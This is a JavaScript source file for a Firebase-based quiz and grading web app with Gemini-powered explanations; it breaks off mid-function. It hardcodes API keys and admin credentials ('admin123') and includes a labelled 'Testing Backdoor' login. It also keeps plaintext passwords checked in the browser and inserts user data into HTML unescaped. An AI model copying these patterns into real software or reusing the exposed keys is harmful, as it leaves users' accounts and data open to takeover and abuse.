/* ================= DEBUGGER (CRITICAL) ================= */
// Ye code humein batayega agar koi syntax error site ko rok raha hai
window.onerror = function(msg, url, line) {
    const errorBox = document.getElementById('app-loader');
    if(errorBox) {
        errorBox.innerHTML = `
            <div style="padding:20px; background:white; color:red; text-align:center;">
                <h3>⚠️ System Crash detected</h3>
                <p>${msg}</p>
                <p>Line: ${line}</p>
                <button class="btn btn-primary" onclick="location.reload()">Reload</button>
            </div>
        `;
    }
    console.error("Critical Error:", msg, "at line:", line);
};

/* ================= IMPORTS ================= */
import { initializeApp, getApps } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-analytics.js";
import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
import { getFirestore, collection, addDoc, doc, deleteDoc, onSnapshot, setDoc, updateDoc, query, limit, getDocs } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

/* ================= CONFIGURATION ================= */
const GEMINI_API_KEY = "AIzaSyDzRs8QaqasDy-C32jiClSvtXWP9BHP1iA"; 
const firebaseConfig = {
    apiKey: "AIzaSyAYtpl1BHFbtwqQ2GQr-aDsS2mAUPKBlN0",
    authDomain: "studyhub-bd4f0.firebaseapp.com",
    projectId: "studyhub-bd4f0",
    storageBucket: "studyhub-bd4f0.firebasestorage.app",
    messagingSenderId: "813436388600",
    appId: "1:813436388600:web:0e388dc2fed77ccc1a670d",
    measurementId: "G-1RCJM1LYBE"
};

/* ================= FIREBASE INIT ================= */
let app;
try {
    if (!getApps().length) {
        app = initializeApp(firebaseConfig);
        try { getAnalytics(app); } catch (e) { console.log("Analytics skipped"); }
    } else {
        app = getApps()[0];
    }
} catch (e) {
    alert("Firebase Init Failed: " + e.message);
}

const auth = getAuth(app);
const db = getFirestore(app);
const appId = "commerce-study-hub"; 
const getColl = (name) => collection(db, 'artifacts', appId, 'public', 'data', name);

/* ================= STATE MANAGEMENT ================= */
let appData = { quizzes: [], users: [], pendingReviews: [], publishedResults: [], admins: [], sessions: [], batches: [] }; 
let currentUser = null; 
let currentQuiz = null;
let currentQIndex = 0;
let userResponses = {}; 
let timerInterval = null;
let currentGradingId = null;
let newQuestionsBuffer = [];
let quizStartTime = 0; 
let isPreviewMode = false;
let pausedTimeRemaining = null; 

const ADMIN_USER = "admin";
const ADMIN_PASS = "admin123";

/* ================= HELPERS ================= */
const hideAll = () => {
    const sections = [
        'section-home', 'section-user-auth', 'section-user-dashboard', 
        'section-admin-login', 'section-admin-dashboard', 'section-quiz-creator', 
        'section-instructions', 'section-active-quiz', 'section-admin-grading', 
        'section-result', 'section-admin-students', 'section-student-profile', 'section-manage-admins',
        'section-batch-hub' 
    ];
    sections.forEach(id => {
        const el = document.getElementById(id);
        if(el) el.classList.add('hidden');
    });
};

/* ================= 1. STARTUP & SYNC ================= */
async function initApp() {
    try {
        await signInAnonymously(auth);
        // Safe check for spy mode
        if(typeof window.initSpyMode === 'function') window.initSpyMode(); 
    } catch (error) {
        console.error("Auth failed", error);
        document.getElementById('app-loader').innerHTML = `<div style='text-align:center; padding:20px; background:white;'><p style='color:red'>Connect Failed: ${error.message}</p></div>`;
    }
}

onAuthStateChanged(auth, (user) => {
    if (user) {
        const loader = document.getElementById('app-loader');
        if(loader) loader.style.display = 'none';
        startLiveSync();
    }
});

function startLiveSync() {
    // Quizzes Sync
    onSnapshot(getColl('quizzes'), (snap) => {
        appData.quizzes = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        renderQuizList();
        if(!document.getElementById('section-admin-dashboard').classList.contains('hidden')) renderAdminDashboard();
    }, (error) => console.error("Quiz sync error:", error));

    // Users Sync
    onSnapshot(getColl('users'), (snap) => {
        appData.users = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        if(!document.getElementById('section-admin-students').classList.contains('hidden')) window.filterStudents();
    });

    // Pending Reviews Sync
    onSnapshot(getColl('pending_reviews'), (snap) => {
        appData.pendingReviews = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        if(!document.getElementById('section-admin-dashboard').classList.contains('hidden')) renderAdminDashboard();
        if(currentUser) renderUserDashboard(); 
    });

    // Results Sync
    onSnapshot(getColl('results'), (snap) => {
        appData.publishedResults = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        if(currentUser) renderUserDashboard();
    });

    // Admins Sync
    onSnapshot(getColl('admins'), (snap) => {
        appData.admins = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
    });
    
    // Sessions Sync (Resume Logic)
    onSnapshot(getColl('quiz_sessions'), (snap) => {
        appData.sessions = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        checkResumeStatus();
    });

    // Batches Sync for dynamic dashboard
    onSnapshot(getColl('batches'), (snap) => {
        appData.batches = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
        if (currentUser && document.getElementById('section-user-dashboard').classList.contains('hidden') === false) {
            renderUserBatches(); 
        }
    });

    // Local User Persistence
    const savedUser = localStorage.getItem('cHub_currentUser');
    if(savedUser) {
        try {
            currentUser = JSON.parse(savedUser);
            window.checkUserLoginStatus();
        } catch(e) { console.error("User parse error", e); }
    }
}

function checkResumeStatus() {
    if(!currentUser) return;
    const session = appData.sessions.find(s => s.studentName === currentUser.username && s.status === 'paused');
    const alert = document.getElementById('resume-alert');
    if(alert && session) {
        alert.classList.remove('hidden');
        alert.innerText = `⚠️ Resume incomplete test: ${session.quizTitle || 'Unknown'}`;
        window.resumeSessionId = session.firestoreId;
    } else if (alert) {
        alert.classList.add('hidden');
        window.resumeSessionId = null;
    }
}

window.resumeLastSession = () => {
    if(window.resumeSessionId) {
        const session = appData.sessions.find(s => s.firestoreId === window.resumeSessionId);
        if(session) window.initiateQuiz(session.quizId, true);
    }
};

/* ================= 2. AUTH MODULE ================= */
window.switchAuthTab = (tab) => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    document.getElementById(tab === 'login' ? 'auth-form-login' : 'auth-form-register').classList.remove('hidden');
    document.getElementById(tab === 'login' ? 'auth-form-register' : 'auth-form-login').classList.add('hidden');
};

window.showUserAuth = () => { hideAll(); document.getElementById('section-user-auth').classList.remove('hidden'); window.switchAuthTab('login'); };

window.registerUser = async () => {
    const e = document.getElementById('regEmail').value.trim();
    const u = document.getElementById('regUser').value.trim();
    const p = document.getElementById('regPass').value.trim();
    if(!e || !u || !p) return alert("Fill all fields");
    if(appData.users.find(user => user.username === u)) return alert("Username taken!");
    try {
        await addDoc(getColl('users'), { email: e, username: u, password: p, isBlocked: false });
        alert("Registered! Please Login.");
        window.switchAuthTab('login');
    } catch(err) { alert("Registration Error: " + err.message); }
};

window.loginUser = () => {
    const u = document.getElementById('loginEmail').value.trim(); 
    const p = document.getElementById('loginPass').value.trim();
    
    // Testing Backdoor
    if (u === "student" && p === "student123") { currentUser = { username: "student", password: "student123" }; finishLogin(); return; }
    
    const user = appData.users.find(usr => (usr.username === u || usr.email === u) && usr.password === p);
    if(user) {
        if(user.isBlocked) return alert("🚫 Access Denied: Blocked by Admin.");
        currentUser = user; finishLogin();
    } else alert("Invalid Credentials!");
};
function finishLogin() { localStorage.setItem('cHub_currentUser', JSON.stringify(currentUser)); window.checkUserLoginStatus(); }

window.logoutUser = () => { currentUser = null; localStorage.removeItem('cHub_currentUser'); window.checkUserLoginStatus(); };

window.checkUserLoginStatus = () => {
    const navAuth = document.getElementById('nav-auth-buttons');
    const navProfile = document.getElementById('nav-user-profile');
    
    if(currentUser) {
        if(navAuth) navAuth.classList.add('hidden');
        if(navProfile) navProfile.classList.remove('hidden');
        document.getElementById('nav-username').innerText = currentUser.username;
        document.getElementById('hero-action-btn').innerText = "Go to Dashboard";
        document.getElementById('hero-action-btn').onclick = () => renderUserDashboard();
        renderUserDashboard();
    } else {
        if(navAuth) navAuth.classList.remove('hidden');
        if(navProfile) navProfile.classList.add('hidden');
        document.getElementById('hero-action-btn').innerText = "Login / Register";
        document.getElementById('hero-action-btn').onclick = () => window.showUserAuth();
        window.goToHome();
    }
};

function renderUserDashboard() {
    hideAll();
    document.getElementById('section-user-dashboard').classList.remove('hidden');
    document.getElementById('dash-username').innerText = currentUser.username;
    
    const userPending = appData.pendingReviews.filter(r => r.studentName === currentUser.username);
    const userHistory = appData.publishedResults.filter(r => r.studentName === currentUser.username);

    const pList = document.getElementById('dash-pending-list');
    pList.innerHTML = userPending.length ? '' : '<p style="color:#777">No pending reviews.</p>';
    userPending.forEach(p => pList.innerHTML += `<div style="padding:10px; border-bottom:1px solid #eee;"><strong>${p.quizTitle}</strong> <span class="status-pending">Wait...</span></div>`);

    const hList = document.getElementById('dash-history-list');
    hList.innerHTML = userHistory.length ? '' : '<p style="color:#777">No attempts yet.</p>';
    userHistory.forEach((h) => {
        hList.innerHTML += `
            <div style="padding:10px; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;">
                <div><strong>${h.quizTitle}</strong></div>
                <div><span class="status-completed">${h.score}/${h.max}</span> <button class="btn btn-outline" style="color:#555; border:1px solid #ccc; font-size:10px;" onclick="window.viewResultByIndex('${h.firestoreId}')">View</button></div>
            </div>`;
    });

    renderUserBatches(); 
}

/* ================= 3. ADMIN MODULE ================= */
window.toggleAdminAuth = () => { 
    if(document.getElementById('section-admin-dashboard').classList.contains('hidden')) { 
        hideAll(); 
        document.getElementById('section-admin-login').classList.remove('hidden'); 
    } else window.goToAdminDashboard(); 
};

window.verifyAdmin = () => {
    const u = document.getElementById('adminEmail').value; const p = document.getElementById('adminPass').value;
    const dbAdmin = appData.admins.find(a => a.email === u && a.password === p);
    if ((u === ADMIN_USER && p === ADMIN_PASS) || dbAdmin) { 
        if(typeof window.disableSpyMode === 'function') window.disableSpyMode(); 
        window.goToAdminDashboard(); 
    } else alert("Wrong credentials!");
};
window.logoutAdmin = () => { if(typeof window.initSpyMode === 'function') window.initSpyMode(); window.goToHome(); };

window.goToAdminDashboard = () => { hideAll(); document.getElementById('section-admin-dashboard').classList.remove('hidden'); renderAdminDashboard(); };

window.renderAdminDashboard = () => {
    // Optional checkbox for showing archived
    const chk = document.getElementById('show-archived-chk');
    const showArchived = chk ? chk.checked : false;

    const qList = document.getElementById('admin-quiz-list');
    qList.innerHTML = '';
    
    // Safety filter
    appData.quizzes.forEach(q => {
        // Safe Archive Logic: If 'archived', only show if showArchived is true. 
        // If 'active' or undefined, show if showArchived is false.
        const isArchived = q.status === 'archived';
        
        if (showArchived && !isArchived) return; // Hide active when showing archived
        if (!showArchived && isArchived) return; // Hide archived when showing active

        qList.innerHTML += `
            <div class="report-row" style="background:${isArchived ? '#f9f9f9' : 'white'}; opacity:${isArchived ? 0.7 : 1}">
                <span>${q.title} ${isArchived ? '<b>(Archived)</b>' : ''}</span> 
                <div>
                    <button class="btn btn-outline" style="color:#333; border-color:#999; padding:2px 8px; font-size:12px;" onclick="window.previewQuiz('${q.firestoreId}')">Preview</button>
                    <button class="btn btn-warning" style="padding:2px 8px; font-size:12px;" onclick="window.toggleArchive('${q.firestoreId}', ${!isArchived})">${isArchived ? 'Restore' : 'Archive'}</button>
                    <button class="btn btn-danger" style="padding:2px 8px; font-size:12px;" onclick="window.deleteQuiz('${q.firestoreId}')">Del</button>
                </div>
            </div>`;
    });

    const pList = document.getElementById('pending-eval-list');
    if(pList) {
        document.getElementById('admin-pending-count').innerText = appData.pendingReviews.length;
        pList.innerHTML = appData.pendingReviews.length ? '' : '<p style="color:#666;">No pending submissions.</p>';
        appData.pendingReviews.forEach(sub => {
            pList.innerHTML += `<div class="report-row" style="background:white; border:1px solid #ddd; margin-bottom:5px;"><div><strong>${sub.studentName}</strong> - ${sub.quizTitle}</div><button class="btn btn-warning" onclick="window.openGrading('${sub.firestoreId}')">Grade</button></div>`;
        });
    }
}

window.toggleArchive = async (fid, status) => {
    try {
        await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid), { status: status ? 'archived' : 'active' });
    } catch(e) { alert("Error updating: " + e.message); }
};
window.deleteQuiz = async (fid) => { 
    if(confirm("Delete permanently? This cannot be undone.")) {
        try {
            await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid)); 
        } catch(e) { alert("Delete failed: " + e.message); }
    }
};

/* ================= 4. QUIZ LOGIC (PAUSE/RESUME/PREVIEW) ================= */
window.previewQuiz = (fid) => {
    isPreviewMode = true;
    currentUser = { username: "Admin_Preview" }; // Dummy user
    window.initiateQuiz(fid);
};

function renderQuizList() {
    const con = document.getElementById('quiz-list-container');
    if(!con) return;
    
    // Show everything EXCEPT 'archived' status. Undefined status shows by default.
    const activeQuizzes = appData.quizzes.filter(q => q.status !== 'archived');
    
    con.innerHTML = activeQuizzes.length ? '' : '<p class="muted">No active quizzes.</p>';
    activeQuizzes.forEach(q => {
        con.innerHTML += `<div class="card"><h3>${q.title}</h3><p>⏳ ${q.time} Mins | 📝 ${q.questions ? q.questions.length : 0} Qs</p><button class="btn btn-success" onclick="window.initiateQuiz('${q.firestoreId}')">Attempt</button></div>`;
    });
}

window.initiateQuiz = (fid, isResume = false) => {
    if(!currentUser) return alert("Please Login first!");
    currentQuiz = appData.quizzes.find(q => q.firestoreId === fid);
    
    if(!currentQuiz) return alert("Quiz data missing/deleted.");

    // Check for existing session if not forced resume
    if(!isResume && !isPreviewMode) {
        const session = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === fid && s.status === 'paused');
        const resumeBtn = document.getElementById('resume-btn');
        if(session && resumeBtn) {
            resumeBtn.classList.remove('hidden');
            resumeBtn.onclick = () => window.startTest(true, session);
        } else if (resumeBtn) {
            resumeBtn.classList.add('hidden');
        }
    }

    document.getElementById('ins-title').innerText = currentQuiz.title;
    document.getElementById('ins-text').innerText = currentQuiz.instructions || "Standard Rules";
    document.getElementById('ins-time').innerText = currentQuiz.time;
    document.getElementById('ins-marks').innerText = currentQuiz.totalMarks;
    document.getElementById('ins-student-name').innerText = currentUser.username;
    hideAll(); document.getElementById('section-instructions').classList.remove('hidden');
};

window.startTest = (isResume = false, sessionData = null) => {
    if(sessionData) isResume = true; 
    else if(isResume) {
        sessionData = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId && s.status === 'paused');
    }

    currentQIndex = 0;
    userResponses = (isResume && sessionData && sessionData.responses) ? sessionData.responses : {};
    quizStartTime = Date.now(); // Start fresh tracking for this session part
    
    // Timer Logic
    let timeRemaining = (isResume && sessionData && sessionData.timeRemaining) ? sessionData.timeRemaining : currentQuiz.time * 60;
    
    if(timerInterval) clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        timeRemaining--;
        pausedTimeRemaining = timeRemaining;
        const display = document.getElementById('timer-display');
        if(display) display.innerText = `${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}`;
        
        if(timeRemaining<=0) window.submitTest();
    }, 1000);

    hideAll(); document.getElementById('section-active-quiz').classList.remove('hidden');
    renderGrid();
    loadQuestion();
};

window.pauseTest = async () => {
    if(isPreviewMode) { alert("Cannot pause in preview mode."); return; }
    clearInterval(timerInterval);
    
    const sessionData = {
        studentName: currentUser.username,
        quizId: currentQuiz.firestoreId,
        quizTitle: currentQuiz.title,
        status: 'paused',
        timeRemaining: pausedTimeRemaining,
        responses: userResponses,
        timestamp: Date.now()
    };
    
    const existing = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId);
    try {
        if(existing) {
            await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', existing.firestoreId), sessionData);
        } else {
            await addDoc(getColl('quiz_sessions'), sessionData);
        }
        alert("Test Paused. You can resume from Home.");
        window.goToHome();
    } catch(e) { alert("Save failed: "+e.message); }
};

function renderGrid() {
    const grid = document.getElementById('question-grid-target');
    if(!grid) return;
    grid.innerHTML = '';
    currentQuiz.questions.forEach((_, i) => {
        const hasAns = userResponses[i] !== undefined && userResponses[i] !== null && userResponses[i] !== "";
        grid.innerHTML += `<div id="grid-btn-${i}" class="grid-btn ${hasAns?'answered':''}" onclick="window.jumpToQuestion(${i})">${i+1}</div>`;
    });
}

window.jumpToQuestion = (i) => {
    currentQIndex = i;
    loadQuestion();
};

function loadQuestion() {
    const q = currentQuiz.questions[currentQIndex];
    document.getElementById('active-q-num').innerText = currentQIndex + 1;
    document.getElementById('active-q-type').innerText = q.type.toUpperCase();
    document.getElementById('active-question-text').innerText = q.text;
    const area = document.getElementById('active-options-area');
    area.innerHTML = "";

    // Update Grid Current
    document.querySelectorAll('.grid-btn').forEach(b => b.classList.remove('current'));
    const gridBtn = document.getElementById(`grid-btn-${currentQIndex}`);
    if(gridBtn) gridBtn.classList.add('current');

    if(q.type === 'text') {
        const val = userResponses[currentQIndex] || "";
        area.innerHTML = `<textarea class="input-field" rows="4" onblur="window.saveTextResp(this.value)">${val}</textarea>`;
    } 
    else if (q.type === 'image') {
        const existingImages = userResponses[currentQIndex] || [];
        let previewHTML = existingImages.length ? existingImages.map(src => `<div class="img-card"><img src="${src}" class="uploaded-img"></div>`).join('') : '<p class="muted">No images yet</p>';
        area.innerHTML = `<p class="muted">Upload photos (Multiple allowed).</p><input type="file" accept="image/*" multiple onchange="window.handleImageUpload(this)"><div class="img-preview-box">${previewHTML}</div>`;
    }
    else {
        q.options.forEach(opt => {
            let chk = (q.type==='mcq' && userResponses[currentQIndex]===opt) || (q.type==='msq' && userResponses[currentQIndex]?.includes(opt));
            area.innerHTML += `<label class="option-block"><input type="${q.type==='mcq'?'radio':'checkbox'}" name="qOpt" value="${opt}" ${chk?'checked':''} onchange="window.saveOpt('${q.type}')"><span>${opt}</span></label>`;
        });
    }
    
    const prev = document.getElementById('btn-prev');
    const next = document.getElementById('btn-next');
    const submit = document.getElementById('btn-submit');
    
    if(prev) prev.style.visibility = currentQIndex===0?'hidden':'visible';
    if(next) next.style.display = currentQIndex===currentQuiz.questions.length-1?'none':'block';
    if(submit) submit.style.display = currentQIndex===currentQuiz.questions.length-1?'block':'none';
}

window.saveTextResp = (val) => { userResponses[currentQIndex] = val; updateGridColor(); };
window.saveOpt = (type) => {
    const chk = document.querySelectorAll('input[name="qOpt"]:checked');
    if(type === 'mcq') { if(chk.length) userResponses[currentQIndex] = chk[0].value; }
    else { let arr=[]; chk.forEach(c=>arr.push(c.value)); userResponses[currentQIndex]=arr; }
    updateGridColor();
};
function updateGridColor() {
    const i = currentQIndex;
    const btn = document.getElementById(`grid-btn-${i}`);
    if(userResponses[i] && btn) btn.classList.add('answered');
}

window.handleImageUpload = async (input) => {
    if (input.files && input.files.length > 0) {
        if (!Array.isArray(userResponses[currentQIndex])) userResponses[currentQIndex] = [];
        const previewBox = input.nextElementSibling;
        if (previewBox.innerHTML.includes('<p')) previewBox.innerHTML = '';
        
        for (const file of Array.from(input.files)) {
            try {
                const compressed = await new Promise(resolve => {
                    const reader = new FileReader();
                    reader.onload = (e) => {
                        const img = new Image();
                        img.src = e.target.result;
                        img.onload = () => {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d');
                            canvas.width = 800; canvas.height = (img.height/img.width)*800;
                            ctx.drawImage(img,0,0,canvas.width,canvas.height);
                            resolve(canvas.toDataURL('image/jpeg', 0.6));
                        };
                    };
                    reader.readAsDataURL(file);
                });
                userResponses[currentQIndex].push(compressed);
                const div = document.createElement('div');
                div.className = 'img-card';
                div.innerHTML = `<img src="${compressed}" class="uploaded-img">`;
                previewBox.appendChild(div);
            } catch(e) { console.error("Image error", e); }
        }
    }
};

window.changeQuestion = (d) => { currentQIndex+=d; loadQuestion(); };

/* ================= 5. SUBMISSION & ANALYSIS ================= */
window.submitTest = async () => {
    clearInterval(timerInterval);
    
    // Clear session if exists (except preview)
    if(!isPreviewMode) {
        const session = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId);
        if(session) {
            try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', session.firestoreId)); } catch(e) {}
        }
    }

    const timeTakenSeconds = Math.floor((Date.now() - quizStartTime) / 1000); 
    const timeString = `${Math.floor(timeTakenSeconds/60)}m ${timeTakenSeconds%60}s`;
    
    const submissionData = { 
        studentName: currentUser.username, 
        quizTitle: currentQuiz.title, 
        quizId: currentQuiz.firestoreId, 
        timestamp: Date.now(), 
        timeTaken: timeString 
    };

    const needsGrading = currentQuiz.questions.some(q => q.type === 'text' || q.type === 'image');

    if(isPreviewMode) {
        alert("Preview Complete! Results will be shown but NOT saved.");
        window.showResultView(submissionData, needsGrading, true); 
        return;
    }

    try {
        if(needsGrading) {
            await addDoc(getColl('pending_reviews'), { ...submissionData, questions: currentQuiz.questions, responses: userResponses, totalMaxMarks: currentQuiz.totalMarks });
            window.showResultView(submissionData, true, false);
        } else {
            let score = 0;
            currentQuiz.questions.forEach((q,i) => {
                let ans = userResponses[i]; let correct = false;
                if(q.type === 'mcq' && ans === q.correct) correct = true;
                if(q.type === 'msq' && ans && JSON.stringify(ans.sort())===JSON.stringify(q.correct.sort())) correct = true;
                if(correct) score += q.marks;
            });
            const reportHTML = generateReportHTML(currentQuiz.questions, userResponses);
            await addDoc(getColl('results'), { ...submissionData, score, max: currentQuiz.totalMarks, reportHTML });
            window.viewResultData(score, currentQuiz.totalMarks, reportHTML, false);
        }
    } catch(e) { alert("Submission failed: " + e.message); }
};

window.showResultView = (data, pending, isPreview) => {
    hideAll(); 
    document.getElementById('section-result').classList.remove('hidden');
    document.getElementById('res-status-title').innerText = isPreview ? "Preview Result" : (pending ? "Submitted!" : "Result");
    
    if(pending && !isPreview) {
        document.getElementById('res-pending-msg').classList.remove('hidden');
        document.getElementById('res-score-box').classList.add('hidden');
        document.getElementById('res-details-card').classList.add('hidden');
    } else {
        // Calculate score for preview/auto
        let score = 0;
        currentQuiz.questions.forEach((q,i) => {
            let ans = userResponses[i];
            if(q.type === 'mcq' && ans === q.correct) score += q.marks;
        });
        window.viewResultData(score, currentQuiz.totalMarks, generateReportHTML(currentQuiz.questions, userResponses), isPreview);
    }
};

function generateReportHTML(questions, responses) {
    let html = "";
    questions.forEach((q, i) => {
        let ans = responses[i];
        let correct = false;
        let correctText = "";
        
        if(q.type === 'mcq') { correct = ans === q.correct; correctText = q.correct; }
        if(q.type === 'msq') { correct = ans && JSON.stringify(ans.sort())===JSON.stringify(q.correct.sort()); correctText = q.correct.join(', '); }
        if(q.type === 'text' || q.type === 'image') { correct = true; correctText = "Pending Grading"; }

        html += `
            <div class="report-row" style="flex-direction:column; align-items:flex-start;">
                <div style="width:100%;"><strong>Q${i+1}:</strong> ${q.text} <span class="q-tag">${q.type}</span></div>
                <div style="width:100%; display:flex; justify-content:space-between; margin-top:5px; align-items:center;">
                    <div>
                        <span class="${correct?'correct-ans':'wrong-ans'}">You: ${ans||'-'}</span>
                        ${!correct ? `<br><span style="color:green; font-size:0.9em">Correct: ${correctText}</span>` : ''}
                    </div>
                    <div><strong>${correct ? q.marks : 0}/${q.marks}</strong></div>
                </div>
                <div class="review-actions">
                    <button class="btn btn-mini btn-outline" style="color:blue; border-color:blue;" onclick="window.askAIExplanation(${i})">🤖 Why?</button>
                    <button class="btn btn-mini btn-outline" style="color:red; border-color:red;" onclick="window.challengeQuestion(${i})">🚩 Report</button>
                </div>
            </div>`;
    });
    return html;
}

window.viewResultData = (score, max, html, isPreview) => {
    hideAll();
    document.getElementById('section-result').classList.remove('hidden');
    document.getElementById('res-pending-msg').classList.add('hidden');
    document.getElementById('res-score-box').classList.remove('hidden');
    document.getElementById('res-details-card').classList.remove('hidden');
    document.getElementById('res-score').innerText = score;
    document.getElementById('res-total').innerText = max;
    document.getElementById('detailed-report').innerHTML = html;
    if(isPreview) isPreviewMode = false;
};

/* ================= 6. AI & UTILS ================= */
window.askAIExplanation = async (qIdx) => {
    const q = currentQuiz.questions[qIdx];
    const userAns = userResponses[qIdx] || "No Answer";
    const modal = document.getElementById('ai-explain-modal');
    modal.classList.remove('hidden');
    document.getElementById('ai-explain-text').innerHTML = "Analyzing... 🧠";

    const prompt = `Explain strictly for a student why the correct answer is "${q.correct}" and why user's "${userAns}" is wrong. Question: "${q.text}". Options: ${q.options}. Keep it short.`;

    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
        });
        const data = await response.json();
        const text = data.candidates?.[0]?.content?.parts?.[0]?.text || "AI Error.";
        document.getElementById('ai-explain-text').innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>').replace(/\n/g, '<br>');
    } catch (e) { document.getElementById('ai-explain-text').innerText = "AI Failed."; }
};

window.challengeQuestion = async (qIdx) => {
    const reason = prompt("Describe error:");
    if(!reason) return;
    try {
        await addDoc(getColl('challenges'), { student: currentUser.username, quiz: currentQuiz.title, question: currentQuiz.questions[qIdx].text, qIdx, reason, timestamp: Date.now() });
        alert("Reported to Admin.");
    } catch(e) { alert("Report failed."); }
};

window.goToHome = () => { hideAll(); document.getElementById('section-home').classList.remove('hidden'); renderQuizList(); };

/* ================= 7. ADMIN SUB-FUNCTIONS ================= */
// QUIZ CREATOR
window.showQuizCreator = () => {
    document.getElementById('newQuizTitle').value = "";
    newQuestionsBuffer = [];
    window.updateBufferDisplay();
    hideAll(); document.getElementById('section-quiz-creator').classList.remove('hidden');
};
window.renderAnswerInputs = () => {
    const type = document.getElementById('qType').value;
    const area = document.getElementById('answer-inputs-area');
    area.innerHTML = "";
    if (type === 'text' || type === 'image') area.innerHTML = `<textarea id="correctTextAns" class="input-field" placeholder="Model Answer"></textarea>`;
    else ['A','B','C','D'].forEach((opt, i) => area.innerHTML += `<div class="row" style="margin-bottom:5px;"><input type="text" class="input-field opt-inp" placeholder="Option ${opt}"><input type="${type==='mcq'?'radio':'checkbox'}" name="correctOpt" value="${i}"></div>`);
};
window.addQuestionToBuffer = () => {
    const type = document.getElementById('qType').value;
    const text = document.getElementById('qText').value;
    const marks = parseInt(document.getElementById('qMarks').value) || 1;
    if(!text) return alert("Add text");
    let q = { type, text, marks };
    if(type === 'text' || type === 'image') q.modelAnswer = document.getElementById('correctTextAns').value || "";
    else {
        const opts = []; const correct = []; 
        document.querySelectorAll('.opt-inp').forEach(inp => opts.push(inp.value));
        document.querySelectorAll('input[name="correctOpt"]:checked').forEach(chk => { if(opts[chk.value]) correct.push(opts[chk.value]); });
        if(correct.length === 0) return alert("Select correct option");
        q.options = opts; q.correct = type === 'mcq' ? correct[0] : correct;
    }
    newQuestionsBuffer.push(q); window.updateBufferDisplay();
    document.getElementById('qText').value=""; window.renderAnswerInputs();
};
window.updateBufferDisplay = () => {
    document.getElementById('qCount').innerText = newQuestionsBuffer.length;
    document.getElementById('questions-buffer-list').innerHTML = newQuestionsBuffer.map((q,i)=>`<div class="question-preview">Q${i+1}: ${q.text} (${q.type})</div>`).join('');
};
window.publishQuiz = async () => {
    const title = document.getElementById('newQuizTitle').value;
    if(!title || newQuestionsBuffer.length === 0) return alert("Incomplete");
    try {
        await addDoc(getColl('quizzes'), { title, time: document.getElementById('newQuizTime').value, totalMarks: document.getElementById('newQuizMarks').value, instructions: document.getElementById('newQuizInstructions').value, questions: newQuestionsBuffer, createdAt: Date.now() });
        window.goToAdminDashboard();
    } catch(e) { alert("Publish failed: "+e.message); }
};
window.uploadQuizJSON = (input) => {
    if(!input.files.length) return;
    const reader = new FileReader();
    reader.onload = async (e) => {
        try {
            const d = JSON.parse(e.target.result);
            if (!d.title) throw new Error("Invalid JSON");
            await addDoc(getColl('quizzes'), { title: d.title, time: d.time||60, totalMarks: d.totalMarks||10, instructions: d.instructions||"", questions: d.questions, createdAt: Date.now() });
            alert("Uploaded!"); window.goToAdminDashboard();
        } catch (error) { alert("Error: " + error.message); }
    };
    reader.readAsText(input.files[0]);
};
window.generateAIQuiz = async () => {
    const topic = document.getElementById('aiQuizTopic').value.trim();
    if (!topic) return alert("Enter topic!");
    document.getElementById('ai-quiz-loading').classList.remove('hidden');
    const prompt = `Generate quiz on '${topic}' in valid JSON: { "title": "T", "time": 10, "totalMarks": 5, "instructions": "I", "questions": [ { "type": "mcq", "text": "Q", "options": ["A", "B"], "correct": "A", "marks": 1 } ] }. 5 MCQs.`;
    try {
        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({contents:[{parts:[{text:prompt}]}]}) });
        const d = await res.json();
        const t = d.candidates?.[0]?.content?.parts?.[0]?.text.replace(/```json/g,'').replace(/```/g,'').trim();
        const qd = JSON.parse(t);
        document.getElementById('newQuizTitle').value = qd.title; newQuestionsBuffer = qd.questions; window.updateBufferDisplay();
        alert("Generated!");
    } catch(e) { alert("AI Failed"); } finally { document.getElementById('ai-quiz-loading').classList.add('hidden'); }
};

// GRADING
window.openGrading = (fid) => {
    currentGradingId = fid; const sub = appData.pendingReviews.find(p => p.firestoreId === fid);
    if(!sub) return;
    hideAll(); document.getElementById('section-admin-grading').classList.remove('hidden');
    document.getElementById('grade-student-name').innerText = sub.studentName;
    document.getElementById('grade-quiz-title').innerText = sub.quizTitle;
    const area = document.getElementById('grading-area'); area.innerHTML = "";
    sub.questions.forEach((q, i) => {
        let ans = sub.responses[i]; let auto = 0;
